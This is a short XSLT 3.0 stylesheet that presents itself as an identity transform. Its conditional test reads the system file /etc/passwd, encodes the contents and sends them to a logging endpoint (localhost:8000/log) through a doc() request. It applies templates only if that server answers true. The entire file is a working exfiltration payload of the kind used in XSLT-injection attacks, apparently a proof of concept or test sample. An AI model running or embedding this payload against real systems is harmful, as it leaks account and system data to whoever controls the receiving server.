<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:xs="http://www.w3.org/2001/XMLSchema" exclude-result-prefixes="#all" version="3.0">
    <xsl:mode on-no-match="shallow-copy"/>
    <xsl:template match="/*">
        <xsl:if test="
                let $file := '/etc/passwd',
                    $logserver := 'http://localhost:8000/log?plain=',
                    $encoding := map {
                        'encoding': 'utf8',
                        'method': 'html',
                        'escape-uri-attributes': true()
                    },
                    $read := unparsed-text($file),
                    $encoded := replace($read, '\s+', '_') => serialize($encoding),
                    $response := doc(concat($logserver, $encoded))
                return
                    xs:boolean($response/*:b/text())">
            <xsl:apply-templates/>
        </xsl:if>
    </xsl:template>
</xsl:stylesheet>
